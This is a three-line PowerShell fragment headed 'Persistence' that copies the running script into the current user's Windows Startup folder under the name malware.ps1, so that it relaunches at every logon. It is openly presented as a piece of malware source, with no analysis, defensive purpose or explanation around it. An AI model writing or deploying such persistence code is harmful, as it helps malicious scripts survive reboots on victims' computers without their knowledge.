# Persistence
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\malware.ps1"
Copy-Item $MyInvocation.MyCommand.Path $path
